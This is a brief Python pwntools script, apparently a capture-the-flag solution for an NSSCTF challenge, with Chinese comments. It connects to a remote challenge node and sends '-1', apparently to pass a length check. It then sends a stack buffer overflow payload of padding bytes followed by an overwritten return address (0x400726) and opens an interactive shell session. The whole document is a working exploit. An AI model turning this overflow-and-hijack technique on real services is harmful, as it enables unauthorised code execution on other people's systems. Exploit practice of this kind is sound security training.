from pwn import *

link = remote('node4.anna.nssctf.cn','28778')

payload = (0x10+0x08)*b'A' + p64(0x400726)

link.recvuntil("name:") # 接收直到出现"name:"字符串


link.sendline(b'-1')    #发送`-1`

link.recvuntil("name?")# 接收直到出现"name?"字符串

link.sendline(payload)  #发送payload

link.interactive()